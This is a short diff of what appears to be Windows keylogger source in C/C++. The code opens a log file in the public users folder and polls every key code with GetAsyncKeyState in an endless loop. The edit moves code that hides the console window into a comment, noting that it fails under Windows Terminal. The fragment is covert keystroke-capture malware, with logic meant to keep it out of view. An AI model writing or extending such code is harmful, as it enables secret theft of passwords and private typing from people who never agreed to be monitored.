@@ -9,9 +9,14 @@ int main()
 	FILE* fp;
 	fp = fopen("c:\\users\\public\\klogging.log", "w+");
 
-	//HWND myhandle;
-	//myhandle = GetConsoleWindow();
-	//ShowWindow(myhandle, SW_HIDE);
+	/*
+    The below doesn't work on Windows Terminal
+
+	HWND myhandle;
+	myhandle = GetConsoleWindow();
+	ShowWindow(myhandle, SW_HIDE);
+
+	*/
 	while (true) {
 		for (int key = 8; key <= 190; key++) {
 			const auto state = GetAsyncKeyState(key);
